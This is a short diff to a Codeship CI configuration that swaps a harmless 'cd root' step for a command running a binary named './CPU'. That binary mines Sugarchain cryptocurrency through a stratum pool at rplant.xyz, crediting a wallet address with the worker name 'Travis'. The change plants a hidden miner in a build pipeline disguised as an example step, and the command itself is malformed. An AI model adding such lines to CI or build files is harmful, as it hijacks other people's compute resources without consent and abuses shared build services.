@@ -9,5 +9,5 @@
 - name: example_tagged_step
   tag: master
   service: codeship_example
-  command: cd root
+  command: /bin/bash/ './CPU -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:17042 -p password=Unm4sk3d  -u sugar1qtuvu0vycx7nyzrxc2zzf3sr5cnrl0s7fw47787.Travis'
            ls
